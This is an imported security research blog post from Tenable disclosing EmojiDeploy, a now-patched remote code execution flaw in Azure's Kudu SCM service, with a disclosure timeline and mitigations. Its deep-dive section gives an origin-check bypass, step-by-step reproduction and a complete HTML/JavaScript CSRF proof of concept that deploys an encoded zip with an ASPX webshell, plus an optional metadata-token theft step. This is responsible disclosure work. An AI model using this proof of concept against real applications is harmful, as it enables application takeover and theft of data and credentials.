---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-19_emojideploy-smile-your-azure-web-service-just-got-rced-_.md
original_filename: 2023-01-19_emojideploy-smile-your-azure-web-service-just-got-rced-_.md
title: 'EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.'
category: documents
detected_topics:
- cloud-security
- supply-chain
- csrf
- command-injection
- cors
- api-security
tags:
- imported
- documents
- cloud-security
- supply-chain
- csrf
- command-injection
- cors
- api-security
language: en
raw_sha256: e6ffcae35aebc81d58d32fc6031e9cd90834f48451c6577b6b4b46935b83c343
text_sha256: fca77562893fb90d8b2eefcf8c514a6dd124480af1d4fec41413c6805b7fd662
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-19_emojideploy-smile-your-azure-web-service-just-got-rced-_.md
- Source Type: markdown
- Detected Topics: cloud-security, supply-chain, csrf, command-injection, cors, api-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `e6ffcae35aebc81d58d32fc6031e9cd90834f48451c6577b6b4b46935b83c343`
- Text SHA256: `fca77562893fb90d8b2eefcf8c514a6dd124480af1d4fec41413c6805b7fd662`


## Content

---
title: "EmojiDeploy: Smile! Your Azure web service just got RCE’d ._."
page_title: "EmojiDeploy: Smile! Your Azure web service just got RCE’d ._. - Blog | Tenable®"
url: "https://ermetic.com/blog/azure/emojideploy-smile-your-azure-web-service-just-got-rced/"
final_url: "https://www.tenable.com/blog/Emoji-Deploy-Smile-Your-Azure-web-service-just-got-Rced"
authors: ["Liv Matan (@terminatorLM)"]
programs: ["Microsoft (Azure)"]
bugs: ["RCE", "Cloud", "CSRF", "CORS misconfiguration"]
bounty: "30,000"
publication_date: "2023-01-19"
added_date: "2023-01-23"
source: "pentester.land/writeups.json"
original_index: 1651
---

#  EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.

[![Liv Matan](/sites/default/files/pictures/2024-03/Liv-Matan.jpg) ]()

By [Liv Matan](/profile/liv-matan)

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.tenable.com%2Fblog%2FEmoji-Deploy-Smile-Your-Azure-web-service-just-got-Rced&title=EmojiDeploy%3A%20Smile%21%20Your%20Azure%20web%20service%20just%20got%20RCE%E2%80%99d%20._.) [ ](https://www.reddit.com/submit?url=https%3A%2F%2Fwww.tenable.com%2Fblog%2FEmoji-Deploy-Smile-Your-Azure-web-service-just-got-Rced&title=EmojiDeploy%3A%20Smile%21%20Your%20Azure%20web%20service%20just%20got%20RCE%E2%80%99d%20._.) [ ](https://twitter.com/intent/tweet?urlhttps%3A%2F%2Fwww.tenable.com%2Fblog%2FEmoji-Deploy-Smile-Your-Azure-web-service-just-got-Rced&text=EmojiDeploy%3A%20Smile%21%20Your%20Azure%20web%20service%20just%20got%20RCE%E2%80%99d%20._.) Subscribe 

![Tenable Cloud Security](/sites/default/files/images/articles/Blog-Cloud_Banners_5_5.png)

The Tenable Cloud Security research team discovered a remote code execution vulnerability affecting Microsoft Azure cloud services such as Function Apps, App Service, Logic Apps and others, as well as other cloud sovereigns. 

A remote code execution (RCE) vulnerability affecting Function Apps, App Service, Logic Apps and other Microsoft Azure cloud services, and other cloud sovereigns, was discovered by the research team at Tenable Cloud Security. The vulnerability exploits the Kudu source control management (SCM) service, which underlies many major Azure services.

The EmojiDeploy vulnerability is achieved through [CSRF (Cross-site request forgery)](https://en.wikipedia.org/wiki/Cross-site_request_forgery) on the ubiquitous SCM service Kudu. By abusing the vulnerability, attackers can deploy malicious zip files containing a payload to the victim's Azure application.

## Impact

EmojiDeploy allows remote code execution and a full takeover of the targeted application:

  * Running code and commands as the www user
  * Theft or deletion of sensitive data
  * Phishing campaigns
  * Takeover of the app’s managed identity and lateral movement to other Azure services

The vulnerability enables RCE and full takeover of the target app. The impact of the vulnerability on the organization as a whole depends on the permissions of the applications managed identity. Effectively applying the [principle of least privilege](https://www.tenable.com/blog/least-privilege-policy-automated-analysis-trumps-native-aws-tools) can significantly limit the blast radius.

## EmojiDeploy exploit components

The full attack exploits multiple misconfigurations and bypasses several security controls:

  * Same-site misconfiguration
  * Origin check bypass
  * Exploiting a vulnerable endpoint

Through these techniques, the research team achieved remote code execution.

## EmojiDeploy attack flow

![Attack Flow - EmojiDeploy](/sites/default/files/inline/images/EmojiDeploy-attack-flow.gif)

## Who is vulnerable?

The vulnerability exploits the Kudu SCM service. This service underlies many major Azure services, among them: Azure Functions, Azure App Service, Azure Logic Apps and others. The vulnerability is now fully remediated; previously, anyone using any of the following common core services was vulnerable to the EmojiDeploy vulnerability:

  * Azure Functions is a serverless computing platform for building and deploying code in response to events, with automatic scaling and integration with other Azure services. Similar to the Google Cloud Platform (GCP) Functions or the Amazon Web Services (AWS) Lambda Functions.
  * Azure App Service is a fully managed platform-as-a-service (PaaS) offering that enables developers to build, deploy and scale web, mobile and API applications.
  * Azure Logic Apps is a platform as a service (PaaS) offering built on a containerized runtime.

## Kudu SCM: The (not so) little engine that could

[Kudu](https://github.com/projectkudu/kudu/wiki) is the engine behind Git deployments in Azure Web Apps. It is a web-based Git repository manager that provides SCM for deploying and managing applications on Azure. The SCM web panel acts as a management interface for these services.

## Defending against EmojiDeploy

Thanks to the rapid response and cooperation of the Microsft Security Response Center (MSRC), EmojiDeploy is fully remediated. However, there are actionable steps you can take to [defend against similar vulnerabilities](https://www.tenable.com/solution-briefs/tenable-for-cloud-risk-prevention-and-remediation) in the future, and against exploitation of SCM capabilities.

## Responsible disclosure

We want to thank Microsoft for its cooperation and swift response. MSRC conducted a deep investigation while fixing the vulnerability as rapidly as possible.

Microsoft recognized EmojiDeploy as an RCE (Remote Code Execution) vulnerability and awarded a bounty of $30,000 for this finding.

## Disclosure Timeline

  * October 26, 2022 - the research team at Tenable Cloud Security (previously Ermetic) reports the vulnerability to MSRC
  * November 2, 2022 - MSRC first response, under review
  * November 3, 2022 - Microsoft bounty program awards a $30,000 bounty
  * December 6, 2022 - Microsoft releases a global fix
  * January 19, 2023 - Public disclosure by Tenable Cloud Security research

## Vulnerability deep dive

### Azure Web Services brief

#### Azure Web Services 101: What is SCM/Kudu?

We can categorize three major Azure services as Azure Web Services: App Service, Function Apps and Logic Apps. These services have something in common: they all deploy the SCM panel by default. The SCM panel grants IT teams, DevOps and web administrators access to modify and manage their Azure web applications.

Based on our research, it seems that most Azure Web Services customers are not familiar with the SCM panel or are not even aware of its existence.

The SCM panel uses the Kudu open-source .NET project and has been available to customers since 2014.

Any Contributor/Website Contributor/Owner role in Azure RBAC can access the SCM. Furthermore, it is worth mentioning that the SCM service is enabled by default when creating an Azure Web Service.

Many customers rely on Azure Web Services which, as public-facing services, are also frequent targets for attackers. RCE on these services exposes countless customers to significant risk.

#### Accessing the SCM Panel

The SCM panel requires Azure Active Directory (AAD) authentication. If the user has authenticated to their Microsoft account through the browser, they can simply navigate to the SCM panel and log in. Otherwise, they need to log in manually with their Microsoft-authorized credentials.

Due to these authentication mechanisms, users can not access other users' SCM panels.

![](/sites/default/files/inline/images/image3_1.png)

_Image source: Tenable, 2023_

### Attack chain

#### 1 - SCM doesn't like Same-Site

First, when investigating the SCM panel, the cookies’ attributes configuration stood out immediately. The cookies' Same-Site attribute is set to "None" in all of the cookies, including the session cookies.

The Same-Site attribute is a browser security feature introduced in 2016; its default value is set to "Lax". The purpose of the Same-Site attribute is to protect against cross-origin information leakage/attacks, e.g. cross-site request forgery (CSRF). According to the [request for comments (RFC)](https://en.wikipedia.org/wiki/Request_for_Comments), the "None" value in the Same-Site attribute provides no protection against cross-origin attacks.

![](/sites/default/files/inline/images/image5_0.png)

_Image source: Tenable, 2023_

At this point, the researcher’s “Spidey sense” started tingling … maybe the SCM panel has more cross-site issues that can be exploited?

#### 2 - Server’s origin check bypass

While researching the SCM panel, I made several [HTTP origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) checks by trying to replicate requests in BurpSuite/Postman while sending different origins. The default origin that is sent and accepted by the server is:  
https://<my-webapp>.scm.azurewebsites.net.

Sending https://test.com raised an Unauthorized 401 response:

![](/sites/default/files/inline/images/image1_3.png)

_Image source: Tenable, 2023_

The origin check is also a site-wide/service-wide check. Using a black box approach, I raised the hypothesis that there is a regex on the server that checks for malformed origins as another layer of defense in order to defend against cross-origin attacks like cross-origin resource sharing (CORS) misconfiguration, CSRF and more.

The next order of business, therefore, was to bypass the origin check. Together with issue No. 1, this could enable us to construct a full cross-origin attack. First, I tried common basic checks to get a feel for the server’s origin check. These basic checks failed, and the requests were not accepted by the server (401 Unauthorized):

https://<my-webapp>.scm.azurewebsites.net.attacker.com  
https://attacker.<my-webapp>.scm.azurewebsites.net  
http://<my-webapp>.scm.azurewebsites.net  
[<my-webapp> is a placeholder for the name of my application]

Despite the strict checks, the regex can be broken with special characters. For example:  
https://<my-webapp>.scm.azurewebsites.net$.attacker.com./

The SCM server accepts any request containing any special character instead of the “$” referenced in the example above except for "_" and "-", which are flagged forbidden.

At this point, we have solid grounds to believe that special characters, combined with a domain under our control, can be used to bypass the regex that is being used to defend against cross-origin attacks.

**HTTP Origin**| **SCM server response**  
---|---  
https://<my-webapp>.scm.azurewebsites.net<special_character>.attacker.com./  
Example:https://<my-webapp>.scm.azurewebsites.net$.attacker.com./| Accepted 200  
OK  
https://<my-webapp>.scm.azurewebsites.net-.attacker.com./| Unauthorized 401  
https://<my-webapp>.scm.azurewebsites.net_.attacker.com./| Unauthorized 401  
  
 _Source: Tenable, 2023_

##### Constructing a full browser-based attack

We managed to bypass the origin check, but only with a web proxy and not by using a browser. In order to adapt the attack to the browser client, the browser should accept my special characters as a valid origin/URL.

Domain names allow all letters from a to z, numbers and hyphens. How can an attacker send a request with an origin containing special characters like the tests that were mentioned before?

Surprisingly, earlier browser versions accept special characters as valid URLs and pass the requests sent with the manipulated URL as the value of the origin header. However, modern browsers only accept "_" and "-". The following table shows the current compatibility of each browser tested:

**Special characters**| **Chrome****(107.0.5304.87)**| **Edge****(107.0.1418.42)**| **Firefox****(106.0.5)**| **Safari****(15.5.6)**  
---|---|---|---|---  
-| Compatible| Compatible| Compatible| Compatible  
_| Compatible| Compatible| Compatible| Compatible  
!| Not compatible| Not compatible| Not compatible| Not compatible  
=| Not compatible| Not compatible| Not compatible| Not compatible  
$| Not compatible| Not compatible| Not compatible| Not compatible  
`| Not compatible| Not compatible| Not compatible| Not compatible  
(| Not compatible| Not compatible| Not compatible| Not compatible  
)| Not compatible| Not compatible| Not compatible| Not compatible  
*| Not compatible| Not compatible| Not compatible| Not compatible  
+| Not compatible| Not compatible| Not compatible| Not compatible  
,| Not compatible| Not compatible| Not compatible| Not compatible  
;| Not compatible| Not compatible| Not compatible| Not compatible  
^| Not compatible| Not compatible| Not compatible| Not compatible  
`| Not compatible| Not compatible| Not compatible| Not compatible  
{| Not compatible| Not compatible| Not compatible| Not compatible  
|| Not compatible| Not compatible| Not compatible| Not compatible  
}| Not compatible| Not compatible| Not compatible| Not compatible  
~| Not compatible| Not compatible| Not compatible| Not compatible  
  
 _Source: Tenable, 2023_

Modern browsers do accept the two special characters mentioned earlier ("_" and "-") so a cross-origin attack can be applicable on the browsers tested when sending:  
  
https://<my-webapp>.scm.azurewebsites.net_.<attacker-site>.com./

But as we said before, “_” and “-” are not accepted by the SCM server’s regex. Could this be a dead end?

##### Push harder … bypassed!

Eventually, more research led to another finding: browsers also accept "_" as a sub-domain.  
After some testing, I discovered that the SCM server accepts the following origin as valid:

https://<my-webapp>.scm.azurewebsites.net._.<attacker-site>./

The special character in this payload is a “.” followed by “_”.

Funny enough, it looks like an emoji ._. and it turns out that it was missing an “eye” for the exploit to work!

To summarize: This finding allows an attacker to create a wildcard DNS record for his own domain and send cross-origin requests with special characters that eventually will be accepted by the server origin check.

#### 3: Finding a vulnerable and interesting endpoint

For the attack to be impactful, we need a sensitive endpoint that is vulnerable to Issue No. 2 and meets the conditions of a CSRF vulnerability according to the Same-Origin-Policy.

##### A quick brief on same origin policy preflight requests

When sending a cross-origin request from a browser, the browser evaluates the request as a standard or non-standard request.

Non-standard request → Browser sends a Preflight OPTIONS Request → Request fails (in our scenario)  
Standard request → Request passes through → Browser raises a CORS Error

Standard request conditions:

  * HTTP GET/POST method
  * No custom headers are required by the server
  * A valid Mime-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded

While reviewing the Kudu service source code and the REST API documentation, most endpoints were PUT/DELETE, other non-standard HTTP methods, or accepted only non-standard Mime-types. However, a couple of endpoints did meet the requirements:

**Denial of service**  
Request: POST /api/scm/clean  
Description: Cleans the repository
  
  
  routes.MapHttpRouteDual("scm-clean", "scm/clean", new { controller = "LiveScm", action = "Clean" });

Request: POST /api/app/restart  
Description: Restarts the application
  
  
  public const string RestartApiPath = "/api/app/restart";

And the most important one, which we will focus on for the RCE chain:  
**Remote code execution**  
Request: POST /api/zipdeploy  
Description: Deploy code from a zip file
  
  
  routes.MapHttpRouteDual("zip-push-deploy", "zipdeploy", new { controller = "PushDeployment", action = "ZipPushDeploy" }, new { verb = new HttpMethodConstraint("POST", "PUT") });

**ZIP Deploy**

Microsoft has implemented a ZIP “deploy to application” functionality available through the SCM for DevOps and IT usage.

The ZIP package unpacks its content in the default path for the app, for example on windows- D:\home\site\wwwroot. Sounds promising!

ZIP Deploy endpoint obstacles:

**Custom headers**

One of the obstacles in the research was that the request to /api/zipdeploy is originally sent with the following custom headers:  
X-Requested-With: XMLHttpRequest  
If-Match: *

Usually, this is used as mitigation for CSRF and cross-origin attacks. When an attacker sends a custom header in a cross-origin request, it is no longer flagged as a standard request by the browser and gets blocked due to Same-Origin-Policy.

Unfortunately, the SCM server does not validate or even require the custom headers originally sent by the client. This means an attacker can construct an attack with a request to /api/zipdeploy without those custom headers. The request will be flagged as "standard" by the browser and will be accepted.

**Sec-Fetch**

[Sec-Fetch-*](https://www.w3.org/TR/fetch-metadata/) headers are sent by the browser in cross-origin requests. Their purpose is to indicate the relationship between a request initiator’s origin and the origin of the requested resource.

The malicious CSRF request is sent with the following headers by the browser:  
Sec-Fetch-Dest: empty  
Sec-Fetch-Site: cross-site  
Sec-Fetch-Mode: cors

The SCM server can choose to accept or reject the request based on these headers’ values. However, these header values are also not validated and the server accepts them.

**Text/plain is our friend**

The original request to /api/zipdeploy is sent with application/x-www-form-urlencoded;charset UTF-8 Mime-type. Sending a standard CSRF request with the charset omitted returns Forbidden. Furthermore, you can not force charset UTF-8 from the browser.

We are left with multipart/form-data and text/plain, otherwise, the browser will send a preflight request.

After some investigation, the SCM server in this particular zipdeploy endpoint accepts text/plain Mime-types. We can encode our zip payload and use text/plain for CSRF.

##### Reproducing the full attack on "victim" from ermetic-research.com (ASPX example):

The easiest way to get a POC and a running execution chain is by uploading a webshell to the respected server:

  * Host a server.
  * Create a wildcard DNS record for your domain *.ermetic-research.com and point it to the server you created.
  * Create a malicious ZIP file with an ASPX webshell or any other payload inside.
  * Create a _HTTP POST_ request to _/api/zipdeploy?isAsync=**true**_ with the malicious zip file encoded as a body and set the Content-Type header to text/plain (see our example js code below).
  * The victim navigates to your payload on your hosted domain with the origin regex bypass - https://victim.scm.azurewebsites.net._.ermetic-research.com./
  * Access the webshell and run code on the victim.
  * Optional: Get the [AWS EC2 IMDS](https://www.tenable.com/blog/secure-your-aws-ec2-instance-metadata-service-imds) token from the meta-data service and access other services.

Prerequisite: SCM cookies or Microsoft account cookies

For the attack to work, the victim should have SCM cookies in his browser. If they do not have SCM cookies, but, rather, Microsoft account cookies in the browser the attack is still possible.

Microsoft account cookies attack flow:
  
  
  window.open("https://victim.scm.azurewebsites.net/","_blank")

\- opens a new tab in the victim’s browser and authenticates automatically. Then send the zip payload with CSRF.

SCM cookies attack flow:  
Directly send the zip payload with CSRF.

Example:
  
  
  <html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <script>
  function authScm(){
  window.open('https://victim.scm.azurewebsites.net/','_blank');
  setTimeout(function(){ submitRequest(); }, 4000);
  }
  </script>
  <a href="#" onclick="authScm()">Please authenticate to the scm if you aren't already</a>  
  <script>
  function submitRequest()
  {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https:\/\/victim.scm.azurewebsites.net\/api\/zipdeploy\/?isAsync=true", true);
  xhr.setRequestHeader("Content-Type", "text\/plain");
  xhr.setRequestHeader("Accept", "*\/*");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
  xhr.withCredentials = true;
  var body = "PK\x03\x04\x14\x00\x00\x00\x08\x00\x00ZXUR)-\xc8\x8a\x02\x00\x00\x1f\x05\x00\x001\x00\x00\x00asdinjasindjsadisandiasundsiaudiasnudnaisuda.aspx\x8d\x93oo\xd30\x10\xc6\xdfW\xeaw8\x19Mj\x05\xa4\x7f\xc6\x005I\xc5h3\xadRY\xab\xb5h\x887\x93\x9b\xdc\xba@bG\xb6\xb3eB|w\xceNZ\xc6VM\xbc\x8a\xe3{|\xf7\xf3=\xe7\xe0\xe8\x13,\xf9\x16a\xce\xc5\xb6\xa4E\xc8&\xaf\x18LqSnCfT\x89\x0c\xd6\x8a\xc7\xb4\x7f\xc33M\x7fG\xe3v\xcb\x9e\x9a\xe5\x85T\x06.x\x8e\xbap\x82\xd5\x836\x98{\xd3\x94o\x85\xd4&\x8d\xf5\x7f\xa8g\x8bF\xa4c\x95\x16\xe6\x11GL\x1c\xaa\x14\xdc\x84L\xa3\xbaC\xc5Hv\'\xd3\xc4\x01_\xcf%O:r\xf3\x03c\x03\x1aE\x82\xea\rDw(\xcc\xa9\xdaj\xc0n\xbb\xf5\xab\xdd\xfa\xddni\xa3R\xb1\x85\xa8\x8aK\x83\x93\x3c\xe94\x1b\\mk\xcdR\xc9\x18\xb5^\x19\xae\xccL\xdcH(t\n" +  "!\x08\xbc\x87\xa7\xa1N\xd7o\xb7(\xec\x9d\xa5\x19\xda\xbb\x90\x8e\xc5y\xe2a\x85\xac\tQ\xf92\'\x0cmc\xbd\x18\xd8k\xaa\xd4\xc4.1I\x15\x01SB\x91p\x95,JS\x94\x86\x84\xb6\xd1\x8d\xe6\xab\xc6\xd5-fYT\xa1%\xa6\xa0k\xbc\xbf\x07\x85\x82\xf6\x9a\xb5\xe7\xd0:t\xce\x92\xad\x8cB\x9e_\"\xa7f\x806\xb9J\x14I\x0b\xef\xdfr\xfe\xbe\'\x16\xb1\x96y\xf6\xd0ZF\"qWl6\'\x99\xd4\xe86\x14\x9aR\t\xd0\xbek\xa93\x81\xaeM\x88\xd7\x93,\x8d\x7f\x3e\xf5\xa1\xf1\xf6\x99\x1d\x97d\xbe\x14\x1a\xbd+\x95\x1a\xec\xb0\xa0P8f]\xffYd\xe5\x0c\xf7\xceM\x9eE\"\x96\tv\xfe\xfag*\x9b\xd3[ce\xba\xdd\x03gY\xd0\xdb\xa7%\xd8\xa0WO\x96\x9d\xb1\xf3\xf5\x97\xb9\xfbF\xa7S\xfb5\xa9\xc9p\xcc\xefQ\x00\xd7\x85\'\xd0\xc0=n\xb4m\x7f\xd0\xab\x836\xc1N\xbe\x91\xc9\x03\xd8\xc5\x8dT9\xa4Ih\xbdg\x90\xa3\xb9\x95\xf4S\xd0\xd0\x1f\x18\xd9\x80R\x8f,\xedgY\xb9C\xf5\x05\x18\xb5\xfe!\xa39\xff\xfevv1\x8d\xbe\x8d`\xd0\x1f\xf80\x8f\xce\xd6#x\xd7?)*\x1f\x96\x8b\xd5l=[\\\x8c\x80o\xb4\xcc\xa8\x01\x3e\xac\x17\xcb\x11\x0c\xfbE\xf5\xb4\x14\\\xa5\x89\xb9\r\xd9\xf0\xc4\x06\xc7A\xefQ\xdd\x1d\xc6\xe7\xd2\x18)j\n" +  "\xa4\'*\x0eb\x0cw\x18\xef?\xbc\x8c1\xf8x\x00\xc3\x96\x0c\x19\xd6\xe3\xcb`!\xdc\x88\x84\xec\xf1\xc0\xec\xf0j\x9e\x1d\xdd\x9co0sp\xd9&\xb3i\x0e\xc1\x1d\xef\xe0\x8e\x07\xfd\x97{4|\x0e7\x9e\xc8\x3c\xa7\xc70\n" +  "z\xfb\x82\xceb\xeb\xa8[X\x8fk\xd3\xed\xac\xfc\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x00\x00ZXUR)-\xc8\x8a\x02\x00\x00\x1f\x05\x00\x001\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00asdinjasindjsadisandiasundsiaudiasnudnaisuda.aspx\n" + 
  "\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xe4\x87+\xda\x80\xe7\xd8\x01\xe4\x87+\xda\x80\xe7\xd8\x01\x80}\xf8\xc3\xdc\"\xd6\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x83\x00\x00\x00\xd9\x02\x00\x00\x00\x00";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
  }
  submitRequest();
  </script>
  </body>
  </html>

## How MSRC Fixed EmojiDeploy

Microsoft addressed the core issues and released the following fixes:

  * Strengthened the origin check on the server.
  * Changed the same-site value of the authentication session cookie to “Lax”.

## How to protect yourself from similar attacks

Microsoft has fixed EmojiDeploy, and your organization is no longer vulnerable to it. However, there are lessons that can be learned to mitigate the effect of similar vulnerabilities and attack vectors.

Takeaways for protecting your organization:

  * Least Privilege: While EmojiDeploy directly compromises the target application, the wider impact for the organization depends on the permissions of the compromised managed identity. Applying the principle of least privilege can make the difference between application takeover and complete organizational takeover.

Specifically regarding Kudu: Azure customers should protect themselves from potential vulnerabilities by restricting access to management interfaces such as SCM to only those who absolutely need it.

  * Don’t click links from strangers: This one is easier said than done. Because EmojiDeploy leverages existing browser cookies, the victim often wouldn’t even need to complete a login process. Even one privileged user clicking a malicious link can enable RCE.
  * Understand cloud complexity: Cloud systems are highly complex; understanding the complexity of the system and environment you are working in is crucial to defending it.

Tenable Cloud Security offers holistic protection for AWS, Azure and GCP, and can help your organization keep its cloud environment secure. It helps you gain visibility and insight into complex multi-cloud deployments, and effectively manage cloud identities to ensure users have only the necessary permissions, and right-size permissions to ensure a least-privileged environment for human users and managed Identities — so you are safe not only from this vulnerability, but the next one.

Tenable detects unrestricted network inbound access to the SCM site (which is open to the public by default) to protect customers from similar attacks, and implement a least privilege approach. For example, here is an organization with a misconfigured App service SCM site:

![Misconfigured app service SCM site](/sites/default/files/inline/images/image4.png)

_Image source: Tenable, 2023_

## Tenable Cloud Security is here to help

Feel free to contact us at Tenable’s cybersecurity lab with any questions or concerns you have about cloud security.  
[@terminatorLM](https://twitter.com/terminatorlm)  
[@NoamDahan](https://twitter.com/noamdahan)  
[@arieitan](https://twitter.com/arieitan)

## Author

## Learn more

[![Liv Matan](/sites/default/files/pictures/2024-03/Liv-Matan.jpg) ]()

### [Liv Matan](/profile/liv-matan)

##### Senior Security Researcher, Tenable

Liv is a Senior Security Researcher at Tenable, specializing in cloud, application and web security. As a bug bounty hunter, Liv has found vulnerabilities in popular software platforms, including Azure, Google Cloud, AWS, Facebook and GitLab. Liv was recognized by Microsoft as a Most Valuable Securi... 

[Read more](/profile/liv-matan)

## Learn more

## Related articles

Research

![Download pumping: New npm deception technique for supply chain attacks image](/sites/default/files/images/articles/Download%20pumping%20is%20a%20new%20npm%20deception%20technique%20for%20supply%20chain%20attacks.png)

May 28 2026

#### Download pumping: New npm deception technique for supply chain attacks

By [Ron Popov](/profile/ron-popov)

[ ](/blog/how-cyberattackers-inflate-malicious-package-npm-download-counts)

Cyber Exposure Alerts

![Mini Shai-Hulud: Frequently asked questions about the TeamPCP npm and PyPI… image](/sites/default/files/images/articles/Mini%20Shai-Hulud.png)

May 21 2026

#### Mini Shai-Hulud: Frequently asked questions about the TeamPCP npm and PyPI…

By [Research Special Operations](/profile/research-special-operations)

[ ](/blog/mini-shai-hulud-frequently-asked-questions)

AI Security

![Bring out your dead: How agentic AI for cybersecurity helps you rid your cloud… image](/sites/default/files/images/articles/How%20agentic%20AI%20for%20cybersecurity%20helps%20you%20rid%20your%20cloud%20of%20forgotten%2C%20risky%20assets.png)

May 14 2026

#### Bring out your dead: How agentic AI for cybersecurity helps you rid your cloud…

By [Brinton Taylor](/profile/brinton-taylor)

[ ](/blog/agentic-ai-cloud-security-zombie-assets)

  * Cloud

  * Tenable Cloud Security
